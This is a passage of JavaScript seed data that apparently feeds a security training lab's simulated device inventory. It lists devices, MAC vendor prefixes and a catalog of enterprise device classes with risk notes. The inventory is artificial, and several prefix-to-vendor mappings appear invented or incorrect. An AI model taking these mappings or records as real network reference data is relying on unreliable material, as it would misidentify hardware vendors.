    ip:'10.20.5.90', mac:'00-04-F2-6C-55-31', vendor:'Polycom', network:'CORP-LAN',
    onboardingStatus:'Unsupported', discoverySource:'Basic', riskLevel:'Low',
    firstSeen:'2025-01-22T00:00:00Z', lastSeen:'2026-06-28T10:05:00Z', highValue:false,
    protocols:['SIP','SSDP','mDNS'], seenBy:['WKS-01'], recommendationCount:1,
    note:'Conference room display/codec.' },
  { id:'DD-204', name:'HVAC-CTRL-01', tab:'iot', type:'Smart Facility', os:'Tridium Niagara 4',
    ip:'10.20.6.11', mac:'00-40-9D-3E-77-A1', vendor:'Honeywell', network:'BMS-VLAN',
    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'High',
    firstSeen:'2024-08-14T00:00:00Z', lastSeen:'2026-06-28T08:30:00Z', highValue:true,
    protocols:['BACnet','HTTP','Telnet'], seenBy:['FIN-FS-02'], recommendationCount:6,
    note:'Building management controller. OT asset — treat scanning here with care.' },
  { id:'DD-205', name:'BADGE-RDR-07', tab:'iot', type:'Smart Facility', os:'Embedded RTOS',
    ip:'10.20.6.24', mac:'00-06-8E-12-44-90', vendor:'HID Global', network:'BMS-VLAN',
    onboardingStatus:'Insufficient info', discoverySource:'Basic', riskLevel:'Informational',
    firstSeen:'2026-04-02T00:00:00Z', lastSeen:'2026-06-26T22:15:00Z', highValue:false,
    protocols:['ARP','UDP'], seenBy:['FIN-FS-02'], recommendationCount:0,
    note:'Door reader. Passive traffic only — classification is a best guess.' },
  { id:'DD-206', name:'SMART-TV-CAFE', tab:'iot', type:'Smart Appliance', os:'Tizen 7.0',
    ip:'10.20.9.115', mac:'8C-79-F5-2A-64-D3', vendor:'Samsung Electronics', network:'CORP-WIFI',
    onboardingStatus:'Unsupported', discoverySource:'Standard', riskLevel:'Low',
    firstSeen:'2025-11-19T00:00:00Z', lastSeen:'2026-06-27T18:00:00Z', highValue:false,
    protocols:['SSDP','mDNS','HTTP'], seenBy:['WKS-02'], recommendationCount:1,
    note:'Break room TV on the corporate wireless network.' },
];

// ---------- Bulk fleet (the rest of the estate) ----------
// The devices above are the hand-written teaching cases the labs reference by name.
// A tenant this size also carries several hundred ordinary assets spread across
// dozens of classifications, and the device-type distribution only reads like an
// enterprise when they are present. Each classification is described once below;
// the builder expands it into individual devices using a seeded PRNG, so every
// reload produces the identical inventory, addressing, and counts.

// MAC vendor prefixes. Discovery infers the vendor from the OUI, so the prefix and
// the vendor name always agree in the inventory.
const FLEET_OUI = {
  'Cisco Systems':'00-1B-0D', 'Cisco Meraki':'00-18-0A', 'Aruba Networks':'6C-F3-7F',
  'Ubiquiti Networks':'78-8A-20', 'Ruckus Networks':'C0-8A-DE', 'Juniper Networks':'3C-8A-B0',
  'MikroTik':'DC-2C-6E', 'Fortinet':'00-09-0F', 'Palo Alto Networks':'00-1B-17',
  'F5 Networks':'00-01-D7', 'Netgear':'20-4E-7F', 'Zyxel':'5C-6A-80', 'Barracuda Networks':'00-D0-83',
  'Infoblox':'00-1B-2B', 'Gigamon':'00-1D-AC', 'Keysight Technologies':'00-1B-1B',
  'Lantronix':'00-20-4A', 'Raritan':'00-0D-5D', 'Vertiv':'00-E0-86', 'Cradlepoint':'00-30-44',
  'Sierra Wireless':'00-14-3E',
  'Dell Inc.':'A4-83-E7', 'Dell EMC':'00-1D-09', 'Hewlett Packard Enterprise':'3C-D9-2B',
  'HP Inc.':'3C-52-82', 'Lenovo':'50-7B-9D', 'Apple, Inc.':'F0-18-98', 'Fujitsu':'00-0B-5D',
  'Hack Smarter Labs':'00-15-5D', 'VMware, Inc.':'00-50-56', 'QEMU/KVM':'52-54-00',
  'Super Micro Computer':'00-25-90', 'Intel Corporate':'00-1B-21', 'Raspberry Pi Foundation':'B8-27-EB',
  'Espressif Inc.':'A4-CF-12', 'NetApp':'00-A0-98', 'Synology':'00-11-32', 'QNAP Systems':'00-08-9B',
  'Quantum Corporation':'00-E0-9E', 'Veritas Technologies':'00-1B-4F',
  'Samsung Electronics':'8C-79-F5', 'LG Electronics':'00-1E-75', 'Sony Corporation':'00-13-A9',
  'Google, Inc.':'F4-F5-D8', 'Amazon Technologies':'FC-A1-83', 'Roku, Inc.':'B0-A7-37',
  'Sonos, Inc.':'00-0E-58', 'Panasonic':'00-13-49', 'Sharp Corporation':'00-1B-79',
  'Toshiba Corporation':'00-00-39', 'Epson':'00-26-AB', 'Canon Inc.':'00-1E-8F',
  'Xerox Corporation':'00-00-AA', 'Ricoh Company':'00-00-74', 'Brother Industries':'00-80-77',
  'Lexmark International':'00-04-00', 'Konica Minolta':'00-20-6B', 'Kyocera':'00-C0-EE',
  'Zebra Technologies':'00-07-4D', 'Datalogic':'00-07-80', 'Mettler-Toledo':'00-30-7B',
  'Axis Communications':'AC-CC-8E', 'Hikvision':'44-19-B6', 'Hanwha Vision':'00-09-18',
  'Bosch Security Systems':'00-1B-86', 'Genetec':'00-1E-C0', 'Milestone Systems':'00-1C-42',
  'Polycom':'00-04-F2', 'Yealink':'80-5E-C0', 'Avaya':'00-04-0D', 'Mitel Networks':'08-00-0F',
  'Grandstream Networks':'00-0B-82', 'Snom Technology':'00-04-13',
  'Crestron Electronics':'00-10-7F', 'Extron Electronics':'00-05-A6', 'Barco':'00-04-A5',
  'Biamp Systems':'00-19-0D', 'Shure Incorporated':'00-0E-DD', 'Logitech':'00-1F-20',
  'Honeywell':'00-40-9D', 'Siemens':'00-0E-8C', 'Schneider Electric':'00-80-F4',
  'Johnson Controls':'00-14-15', 'Trane Technologies':'00-25-A4', 'Distech Controls':'00-1B-C5',
  'Tridium':'00-01-F0', 'Carrier Corporation':'00-1C-23', 'Belimo':'00-1E-4A',
  'Signify (Philips)':'00-17-88', 'Lutron Electronics':'00-1E-C6', 'Legrand':'00-1B-99',
  'Somfy':'00-1B-3F', 'ecobee':'44-61-32', 'Nest Labs':'18-B4-30',
  'HID Global':'00-06-8E', 'ASSA ABLOY':'00-1C-C1', 'LenelS2':'00-14-6A',
  'Simplex Grinnell':'00-40-0B', 'Notifier':'00-1A-9F', 'KONE':'00-1E-2A', 'Otis Elevator':'00-13-F7',
  'APC by Schneider Electric':'00-C0-B7', 'Eaton':'00-20-85', 'Enphase Energy':'00-1D-C0',
  'SMA Solar Technology':'00-40-AD', 'ChargePoint':'00-25-DC', 'Tesla, Inc.':'4C-FC-AA',
  'Zscaler':'B0-B8-67', 'Citrix Systems':'00-1B-B9', 'BrightSign':'00-1C-27', 'Microsemi':'00-B0-AE',
  'Rockwell Automation':'00-00-BC', 'Mitsubishi Electric':'00-1A-B6', 'OMRON Corporation':'00-00-0A',
  'Beckhoff Automation':'00-01-05', 'Phoenix Contact':'00-A0-45', 'Moxa Inc.':'00-90-E8',
  'Advantech':'00-D0-C9', 'FANUC Corporation':'00-1D-38', 'KUKA Roboter':'00-30-D6',
  'HAAS Automation':'00-1E-3B', 'Sensata Technologies':'00-1D-5A', 'Elo Touch Solutions':'00-1B-EB',
  'NCR Corporation':'00-00-3D', 'Verifone':'00-16-C8', 'Ingenico':'00-1C-D0',
  '(locally administered)':'2E-91-A0',
};

// Where each site's devices live and which onboarded sensors can see them. Sensors
// only report on their own network, so a branch asset is never "seen by" HQ.
const FLEET_SITES = {
  lan:  { network:'CORP-LAN',   seen:['WKS-01','WKS-03','FIN-FS-02','DC01','W10-ENG-04','W10-SALES-11'] },
  wifi: { network:'CORP-WIFI',  seen:['WKS-01','WKS-02','W10-SALES-11','W10-SALES-12'] },
  bms:  { network:'BMS-VLAN',   seen:['FIN-FS-02','W10-OT-BRIDGE'] },
  br:   { network:'BRANCH-LAN', seen:['WKS-02','W10-SALES-12'] },
};

// Fixed subnets for the sites that only use one; CORP-LAN is segmented per role and
// carries its subnet on each catalog entry instead.
const FLEET_SITE_SUBNET = { wifi:'10.20.9', bms:'10.20.6', br:'10.20.12' };

// One entry per device classification.
//   t = device type (what the distribution chart counts)  tab = inventory tab
//   p = name prefix   sub = CORP-LAN subnet   v = vendors   os = OS/firmware pool
//   pr = protocols seen   ob = onboarding status   rk = risk pool   hv = high-value rate
//   n = how many exist per site { lan, wifi, bms, br }
const FLEET_CATALOG = [
  // --- Endpoints, servers, storage ---
  { t:'Workstation', tab:'computers', p:'WKS', sub:'10.20.7', n:{lan:60,br:4},
    v:['Dell Inc.','HP Inc.','Lenovo'], os:['Windows 11 Enterprise 23H2','Windows 11 Pro 23H2','Windows 10 Enterprise 22H2'],
    pr:['ARP','SMB','LLMNR','DHCP'], ob:'Can be onboarded', rk:['Medium','Low','Low'], hv:0,
    note:'Desk workstation on a monitored network with no sensor reporting. Straight coverage gap.' },
  { t:'Laptop', tab:'computers', p:'LT', sub:'10.20.7', n:{lan:18,wifi:34,br:3},
    v:['Dell Inc.','Lenovo','HP Inc.','Apple, Inc.'], os:['Windows 11 Pro 23H2','Windows 11 Enterprise 23H2','macOS 14 Sonoma'],
    pr:['ARP','DHCP','mDNS','SMB'], ob:'Can be onboarded', rk:['Medium','Low','Low'], hv:0,
    note:'Roaming laptop. Seen on corporate wireless without an onboarded sensor.' },
  { t:'Server', tab:'computers', p:'SRV', sub:'10.20.3', n:{lan:24},
    v:['Dell Inc.','Hewlett Packard Enterprise','Super Micro Computer'], os:['Windows Server 2022','Windows Server 2019','Ubuntu Server 22.04 LTS','Red Hat Enterprise Linux 9'],
    pr:['SMB','SSH','HTTPS','ICMP'], ob:'Can be onboarded', rk:['High','Medium','Medium'], hv:0.35,
    note:'Unmanaged server. Server SKUs support the sensor, so this is an onboardable gap.' },
  { t:'Hypervisor host', tab:'computers', p:'ESX', sub:'10.20.3', n:{lan:5},
    v:['Dell Inc.','Hewlett Packard Enterprise'], os:['VMware ESXi 8.0','VMware ESXi 7.0'],
    pr:['HTTPS','SSH','SLP','CIM'], ob:'Unsupported', rk:['High','Medium'], hv:0.8,
    note:'Hypervisor. No Defender for Endpoint sensor exists for this platform — protect it with network controls.' },
  { t:'Virtual machine', tab:'computers', p:'VM', sub:'10.20.3', n:{lan:16},
    v:['VMware, Inc.','QEMU/KVM','Hack Smarter Labs'], os:['Ubuntu Server 22.04 LTS','Windows Server 2019','Debian 12'],
    pr:['SSH','HTTP','ARP'], ob:'Can be onboarded', rk:['Medium','Low'], hv:0.1,
    note:'Guest VM discovered by its own traffic. Onboard it like any other machine.' },
  { t:'Container host', tab:'computers', p:'DOCK', sub:'10.20.3', n:{lan:4},
    v:['Dell Inc.','Super Micro Computer'], os:['Ubuntu Server 22.04 LTS','Flatcar Container Linux'],
    pr:['SSH','HTTPS','etcd','ARP'], ob:'Can be onboarded', rk:['High','Medium'], hv:0.4,
    note:'Container host exposing an API port. Onboardable, and worth prioritising.' },
  { t:'Thin client', tab:'computers', p:'TC', sub:'10.20.7', n:{lan:12,br:2},
    v:['Dell Inc.','HP Inc.'], os:['ThinOS 2308','Windows 10 IoT Enterprise LTSC'],
    pr:['RDP','ARP','DHCP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
    note:'VDI thin client. Locked-down firmware with no sensor available.' },
  { t:'Mobile', tab:'computers', p:'MOB', sub:'10.20.9', n:{wifi:24},
    v:['Samsung Electronics','Apple, Inc.','Google, Inc.'], os:['Android 14','iOS 17.5','Android 13'],
    pr:['DHCP','mDNS','ARP'], ob:'Can be onboarded', rk:['Low','Medium'], hv:0,
    note:'Handset on corporate wireless. Onboardable through the Defender mobile app.' },
  { t:'Tablet', tab:'computers', p:'TAB', sub:'10.20.9', n:{wifi:10},
    v:['Apple, Inc.','Samsung Electronics','Hack Smarter Labs'], os:['iPadOS 17.5','Android 14','Windows 11 Pro 23H2'],
    pr:['DHCP','mDNS','HTTPS'], ob:'Can be onboarded', rk:['Low','Informational'], hv:0,
    note:'Shared floor tablet. No sensor, no policy, full corporate wireless access.' },
  { t:'Rugged handheld', tab:'computers', p:'RGD', sub:'10.20.9', n:{wifi:6,br:2},
    v:['Zebra Technologies','Datalogic','Honeywell'], os:['Android 11 (AOSP)','Android 10 (AOSP)'],
    pr:['DHCP','HTTP','ARP'], ob:'Insufficient info', rk:['Medium','Low'], hv:0,
    note:'Warehouse scanning handheld running a vendor Android build years behind patch level.' },
  { t:'Point of sale terminal', tab:'computers', p:'POS', sub:'10.20.7', n:{lan:2,br:4},
    v:['NCR Corporation','Verifone','Ingenico','Elo Touch Solutions'], os:['Windows 10 IoT Enterprise LTSC','Verifone Engage 3.4'],
    pr:['HTTPS','ARP','SMB'], ob:'Can be onboarded', rk:['High','Medium'], hv:0.5,
    note:'Card-present terminal. In scope for PCI and currently unmonitored.' },
  { t:'Self-service kiosk', tab:'computers', p:'KSK', sub:'10.20.7', n:{lan:3,br:1},
    v:['Elo Touch Solutions','HP Inc.'], os:['Windows 10 IoT Enterprise LTSC','Android 12 (AOSP)'],
    pr:['HTTPS','ARP','DHCP'], ob:'Can be onboarded', rk:['Medium','Low'], hv:0,
    note:'Public-facing kiosk in a lobby. Physically reachable by visitors.' },
  { t:'NAS', tab:'computers', p:'NAS', sub:'10.20.15', n:{lan:5},
    v:['Synology','QNAP Systems','NetApp'], os:['DSM 7.2','QTS 5.1','ONTAP 9.13'],
    pr:['SMB','NFS','HTTPS','SNMP'], ob:'Unsupported', rk:['High','Medium'], hv:0.6,
    note:'Network storage holding departmental shares. Appliance OS — no sensor, patch via vendor firmware.' },
  { t:'SAN array', tab:'computers', p:'SAN', sub:'10.20.15', n:{lan:2},
    v:['Dell EMC','NetApp'], os:['PowerStore 3.5','ONTAP 9.13'],
    pr:['iSCSI','HTTPS','SNMP'], ob:'Unsupported', rk:['Medium'], hv:1,
    note:'Primary block storage. High value: every production volume lives behind it.' },
  { t:'Backup appliance', tab:'computers', p:'BKUP', sub:'10.20.15', n:{lan:2},
    v:['Veritas Technologies','Dell EMC'], os:['NetBackup Flex 10.3','PowerProtect DD 7.10'],
    pr:['HTTPS','SSH','NFS'], ob:'Unsupported', rk:['High'], hv:1,
    note:'Backup target. A ransomware operator reaching this erases the recovery path.' },
  { t:'Tape library', tab:'computers', p:'TAPE', sub:'10.20.15', n:{lan:1},
    v:['Quantum Corporation'], os:['Scalar i3 firmware 320G'],
    pr:['HTTPS','SNMP'], ob:'Unsupported', rk:['Low'], hv:0.5,
    note:'Offline backup library. Management interface reachable from the server VLAN.' },
  { t:'Unknown', tab:'computers', p:'UNK', sub:'10.20.7', n:{lan:4,wifi:6,br:1},
    v:['(locally administered)'], os:['Unknown'],
    pr:['ARP'], ob:'Insufficient info', rk:['Informational'], hv:0,
    note:'Randomized MAC seen briefly. Too little traffic for discovery to classify it.' },

  // --- Network devices ---
  { t:'Switch', tab:'network', p:'SW', sub:'10.20.0', n:{lan:26,br:3,bms:1},
    v:['Cisco Systems','Aruba Networks','Juniper Networks'], os:['Cisco IOS-XE 17.9','ArubaOS-CX 10.11','Junos 21.4'],
    pr:['SNMP','CDP','LLDP','SSH'], ob:'Unsupported', rk:['Medium','Low'], hv:0.2,
    note:'Access switch. Assessed by authenticated SNMP scan rather than an agent.' },
  { t:'Router', tab:'network', p:'RTR', sub:'10.20.0', n:{lan:4,br:1},
    v:['Cisco Systems','Juniper Networks','MikroTik'], os:['Cisco IOS-XE 17.6','Junos 21.4','RouterOS 7.13'],
    pr:['SNMP','BGP','SSH','LLDP'], ob:'Unsupported', rk:['High','Medium'], hv:0.6,
    note:'Routed hop between segments. Firmware currency drives its risk level.' },
  { t:'Firewall', tab:'network', p:'FW', sub:'10.20.0', n:{lan:3,br:1},
    v:['Fortinet','Palo Alto Networks','Cisco Systems'], os:['FortiOS 7.4','PAN-OS 11.0','Cisco ASA 9.18'],
    pr:['SNMP','HTTPS','SSH'], ob:'Unsupported', rk:['High','Medium'], hv:0.8,
    note:'Enforcement point for a segment boundary. Patch through the network team.' },
  { t:'WLAN controller', tab:'network', p:'WLC', sub:'10.20.0', n:{lan:2},
    v:['Cisco Systems','Aruba Networks'], os:['Cisco IOS-XE 17.9 (C9800)','ArubaOS 8.11'],
    pr:['SNMP','CAPWAP','HTTPS'], ob:'Unsupported', rk:['Medium','Low'], hv:0.5,
    note:'Wireless controller. Owns the association state for every corporate AP.' },
  { t:'Wireless access point', tab:'network', p:'AP', sub:'10.20.0', n:{lan:24,br:3},
    v:['Cisco Meraki','Aruba Networks','Ubiquiti Networks','Ruckus Networks'], os:['Meraki MR 30.6','ArubaOS 8.11','UniFi 7.4'],
    pr:['CAPWAP','LLDP','SNMP','mDNS'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
    note:'Ceiling access point serving CORP-WIFI.' },
  { t:'Load balancer', tab:'network', p:'LB', sub:'10.20.0', n:{lan:3},
    v:['F5 Networks','Citrix Systems'], os:['BIG-IP 17.1','NetScaler 14.1'],
    pr:['HTTPS','SNMP','SSH'], ob:'Unsupported', rk:['High','Medium'], hv:0.7,
    note:'Application delivery controller terminating TLS for internal apps.' },
  { t:'VPN gateway', tab:'network', p:'VPNGW', sub:'10.20.0', n:{lan:2},
    v:['Palo Alto Networks','Fortinet'], os:['PAN-OS 11.0','FortiOS 7.4'],
    pr:['IPsec','HTTPS','SNMP'], ob:'Unsupported', rk:['High'], hv:1,
    note:'Remote-access concentrator. Internet-reachable and a standing initial-access target.' },
  { t:'Proxy appliance', tab:'network', p:'PROXY', sub:'10.20.0', n:{lan:2},
    v:['Zscaler','Barracuda Networks'], os:['Zscaler CC 6.2','Barracuda WSG 15.0'],
    pr:['HTTP','HTTPS','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Forward proxy. Egress for most of the estate flows through it.' },
  { t:'Email security gateway', tab:'network', p:'ESG', sub:'10.20.0', n:{lan:1},
    v:['Barracuda Networks','Cisco Systems'], os:['Barracuda ESG 9.2','Cisco AsyncOS 15.5'],
    pr:['SMTP','HTTPS','SNMP'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Mail gateway appliance. Historically a heavily exploited class of device.' },
  { t:'Web filter appliance', tab:'network', p:'WEBFLT', sub:'10.20.0', n:{lan:1},
    v:['Fortinet'], os:['FortiWeb 7.4'], pr:['HTTPS','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'URL filtering appliance sitting in front of the proxy tier.' },
  { t:'DNS appliance', tab:'network', p:'DNSAPP', sub:'10.20.0', n:{lan:2},
    v:['Infoblox'], os:['NIOS 9.0'], pr:['DNS','DHCP','SNMP','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0.8,
    note:'DDI appliance answering internal DNS. Its logs are a hunting goldmine.' },
  { t:'NTP appliance', tab:'network', p:'NTP', sub:'10.20.0', n:{lan:1},
    v:['Microsemi'], os:['SyncServer S650 3.0'], pr:['NTP','SNMP','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0.5,
    note:'Stratum-1 time source. Clock drift here breaks authentication and log correlation.' },
  { t:'Network TAP', tab:'network', p:'TAP', sub:'10.20.0', n:{lan:2},
    v:['Keysight Technologies'], os:['Ixia Vision 5.9'], pr:['SNMP','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Passive tap feeding the monitoring stack.' },
  { t:'Packet broker', tab:'network', p:'NPB', sub:'10.20.0', n:{lan:1},
    v:['Gigamon'], os:['GigaVUE-OS 6.4'], pr:['SNMP','HTTPS','SSH'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Aggregates span traffic for the IDS sensors. Sees everything on the wire.' },
  { t:'IDS sensor', tab:'network', p:'IDS', sub:'10.20.0', n:{lan:2},
    v:['Cisco Systems','Super Micro Computer'], os:['Firepower 7.4','Suricata 7.0 (Ubuntu 22.04)'],
    pr:['HTTPS','SSH','SNMP'], ob:'Unsupported', rk:['Low'], hv:0.5,
    note:'Network detection sensor. Not an endpoint sensor — it sees traffic, not process activity.' },
  { t:'SD-WAN edge', tab:'network', p:'SDWAN', sub:'10.20.0', n:{lan:1,br:2},
    v:['Cisco Systems','Fortinet'], os:['vEdge 20.12','FortiOS 7.4 (SD-WAN)'],
    pr:['IPsec','SNMP','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Branch edge device building the overlay back to HQ.' },
  { t:'Console server', tab:'network', p:'CONS', sub:'10.20.1', n:{lan:2},
    v:['Lantronix','Vertiv'], os:['SLC8000 8.4','ACS8000 3.3'], pr:['SSH','Telnet','SNMP','HTTPS'],
    ob:'Unsupported', rk:['High'], hv:0.7,
    note:'Serial console access to network gear, with Telnet still enabled. Out-of-band means out-of-EDR.' },
  { t:'Baseboard management controller', tab:'network', p:'BMC', sub:'10.20.1', n:{lan:14},
    v:['Dell Inc.','Hewlett Packard Enterprise','Super Micro Computer'], os:['iDRAC9 7.10','iLO 6 1.55','Supermicro BMC 1.73'],
    pr:['HTTPS','IPMI','SSH','SNMP'], ob:'Unsupported', rk:['High','Medium'], hv:0.4,
    note:'Server lights-out controller. Full hardware control below the operating system.' },
  { t:'KVM switch', tab:'network', p:'KVM', sub:'10.20.1', n:{lan:2},
    v:['Raritan','Vertiv'], os:['Dominion KX IV 4.4','Avocent ADX 4.1'], pr:['HTTPS','SNMP'],
    ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Rack KVM. Console access to anything plugged into it.' },
  { t:'Cellular gateway', tab:'network', p:'LTEGW', sub:'10.20.0', n:{lan:1,br:1},
    v:['Cradlepoint','Sierra Wireless'], os:['NetCloud OS 7.24','ALEOS 4.17'],
    pr:['HTTPS','SNMP','IPsec'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'LTE failover gateway — a second path to the internet that bypasses the perimeter firewall.' },
  { t:'Network probe', tab:'network', p:'PROBE', sub:'10.20.1', n:{lan:2},
    v:['Super Micro Computer'], os:['Ubuntu Server 22.04 LTS (probe)'], pr:['SNMP','HTTPS','ICMP'],
    ob:'Can be onboarded', rk:['Low'], hv:0,
    note:'Synthetic monitoring probe. Runs a normal Linux build, so it is onboardable.' },
  { t:'Bandwidth shaper', tab:'network', p:'SHAPER', sub:'10.20.0', n:{lan:1},
    v:['Netgear'], os:['Traffic shaper firmware 4.2'], pr:['SNMP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Traffic shaping appliance on the branch uplink.' },
  { t:'Fiber media converter', tab:'network', p:'FMC', sub:'10.20.1', n:{lan:2},
    v:['Moxa Inc.'], os:['IMC-101 firmware 1.6'], pr:['SNMP','ARP'], ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Copper-to-fibre converter between building risers.' },
  { t:'Industrial switch', tab:'network', p:'ISW', sub:'10.20.6', n:{bms:2},
    v:['Moxa Inc.','Phoenix Contact'], os:['MOXA EDS-508A 3.11','FL SWITCH 2.4'],
    pr:['SNMP','LLDP','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'DIN-rail switch inside the OT cabinet. Discovered passively — the segment is excluded from active probing.' },

  // --- Printing and imaging ---
  { t:'Printer', tab:'iot', p:'PRN', sub:'10.20.5', n:{lan:10,br:1},
    v:['HP Inc.','Brother Industries','Lexmark International'], os:['HP FutureSmart 5','Brother firmware 1.34','Lexmark eSF 6.1'],
    pr:['IPP','PJL','SNMP','mDNS'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
    note:'Floor printer. Embedded web server reachable without authentication.' },
  { t:'Multifunction printer', tab:'iot', p:'MFP', sub:'10.20.5', n:{lan:8,br:1},
    v:['Xerox Corporation','Ricoh Company','Konica Minolta','Canon Inc.'], os:['Xerox AltaLink 103','Ricoh Smart Operation 3.2','bizhub i-Series 4.1'],
    pr:['IPP','SMB','SMTP','SNMP','LDAP'], ob:'Unsupported', rk:['High','Medium'], hv:0.2,
    note:'Scan-to-folder MFP holding stored service-account credentials in its address book.' },
  { t:'Label printer', tab:'iot', p:'LBL', sub:'10.20.5', n:{lan:4},
    v:['Zebra Technologies'], os:['Link-OS 6.5'], pr:['RAW-9100','SNMP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Shipping label printer. Accepts raw print jobs on 9100 from anywhere on the VLAN.' },
  { t:'Large-format plotter', tab:'iot', p:'PLOT', sub:'10.20.5', n:{lan:1},
    v:['HP Inc.','Canon Inc.'], os:['DesignJet firmware 21.1'], pr:['IPP','SNMP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Engineering plotter used for drawings.' },
  { t:'3D printer', tab:'iot', p:'3DP', sub:'10.20.5', n:{lan:2},
    v:['Raspberry Pi Foundation'], os:['OctoPrint 1.10 (Raspberry Pi OS)'], pr:['HTTP','mDNS','SSH'],
    ob:'Can be onboarded', rk:['Medium'], hv:0,
    note:'Prototyping printer driven by a single-board computer with an open web interface.' },
  { t:'Badge card printer', tab:'iot', p:'CARDP', sub:'10.20.5', n:{lan:1},
    v:['HID Global'], os:['Fargo DTC firmware 2.9'], pr:['RAW-9100','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Prints physical access badges. Compromise here is a physical-security problem.' },

  // --- Video surveillance ---
  { t:'Camera', tab:'iot', p:'CAM', sub:'10.20.8', n:{lan:26,br:3},
    v:['Axis Communications','Hikvision','Hanwha Vision','Bosch Security Systems'], os:['Axis OS 11.9','Hikvision 5.7','Wisenet 2.21'],
    pr:['RTSP','HTTP','ONVIF','SSDP'], ob:'Unsupported', rk:['High','Medium','Low'], hv:0,
    note:'Fixed surveillance camera. Firmware updates lag and default credentials are common.' },
  { t:'PTZ camera', tab:'iot', p:'PTZ', sub:'10.20.8', n:{lan:6},
    v:['Axis Communications','Hanwha Vision'], os:['Axis OS 11.9','Wisenet 2.21'],
    pr:['RTSP','ONVIF','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Pan-tilt-zoom camera covering the perimeter.' },
  { t:'Thermal camera', tab:'iot', p:'THERM', sub:'10.20.8', n:{lan:2},
    v:['Axis Communications','Bosch Security Systems'], os:['Axis OS 11.9','Bosch CPP7 8.0'],
    pr:['RTSP','ONVIF','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Thermal imaging camera on the loading dock.' },
  { t:'Network video recorder', tab:'iot', p:'NVR', sub:'10.20.8', n:{lan:2},
    v:['Milestone Systems','Genetec'], os:['XProtect 2024 R1 (Windows Server 2019)','Security Center 5.11'],
    pr:['RTSP','SMB','HTTPS'], ob:'Can be onboarded', rk:['High'], hv:1,
    note:'Video recorder running Windows Server underneath — onboardable, and it holds every camera feed.' },
  { t:'Video encoder', tab:'iot', p:'VENC', sub:'10.20.8', n:{lan:2},
    v:['Axis Communications'], os:['Axis OS 10.12'], pr:['RTSP','HTTP','ONVIF'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Encoder bridging legacy analogue cameras onto the network.' },
  { t:'License plate reader', tab:'iot', p:'LPR', sub:'10.20.8', n:{lan:1},
    v:['Genetec'], os:['AutoVu firmware 5.11'], pr:['HTTPS','RTSP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Car park plate reader. Stores movement records for staff vehicles.' },

  // --- Audio / video / collaboration ---
  { t:'Audio and Video', tab:'iot', p:'CODEC', sub:'10.20.5', n:{lan:8},
    v:['Polycom','Cisco Systems','Logitech'], os:['Poly VideoOS 4.3','RoomOS 11.9','CollabOS 1.12'],
    pr:['SIP','H.323','mDNS','HTTPS'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
    note:'Conference room codec with a camera and microphone in a meeting space.' },
  { t:'Conference room display', tab:'iot', p:'DISP', sub:'10.20.5', n:{lan:8},
    v:['Samsung Electronics','LG Electronics','Sharp Corporation'], os:['Tizen 7.0 (signage)','webOS Signage 6.0'],
    pr:['SSDP','mDNS','HTTP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
    note:'Wall display in a meeting room, joined to the corporate network for casting.' },
  { t:'Projector', tab:'iot', p:'PROJ', sub:'10.20.5', n:{lan:4},
    v:['Epson','Panasonic','Barco'], os:['Epson projector firmware 2.13','PJLink firmware 3.1'],
    pr:['PJLink','HTTP','SNMP'], ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Ceiling projector controlled over PJLink with a default password.' },
  { t:'Digital signage player', tab:'iot', p:'SIGN', sub:'10.20.5', n:{lan:5,br:1},
    v:['BrightSign','Samsung Electronics'], os:['BrightSign OS 9.0','Tizen 7.0 (signage)'],
    pr:['HTTPS','mDNS','NTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Lobby signage player pulling content from an internet source.' },
  { t:'Interactive whiteboard', tab:'iot', p:'IWB', sub:'10.20.5', n:{lan:3},
    v:['Hack Smarter Labs','Samsung Electronics'], os:['Windows 10 Team 2022','Tizen 7.0 (Flip)'],
    pr:['SMB','HTTPS','mDNS'], ob:'Can be onboarded', rk:['Medium'], hv:0,
    note:'Collaboration board. The Windows Team build supports a sensor and is joined to the tenant.' },
  { t:'Audio DSP', tab:'iot', p:'DSP', sub:'10.20.5', n:{lan:2},
    v:['Biamp Systems','Shure Incorporated'], os:['TesiraFORTE 4.5','Shure firmware 4.2'],
    pr:['Dante','HTTP','Telnet'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Room audio processor. Telnet control port open on the AV VLAN.' },
  { t:'Wireless presentation system', tab:'iot', p:'WPS', sub:'10.20.5', n:{lan:4},
    v:['Barco','Crestron Electronics'], os:['ClickShare 2.14','AirMedia 4.3'],
    pr:['HTTPS','mDNS','SSDP'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
    note:'Screen-sharing base unit that bridges guest laptops onto the display network.' },
  { t:'Streaming media player', tab:'iot', p:'STRM', sub:'10.20.5', n:{lan:2},
    v:['Roku, Inc.','Amazon Technologies'], os:['Roku OS 13','Fire OS 7'],
    pr:['SSDP','mDNS','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Media stick plugged into a breakout-area TV.' },
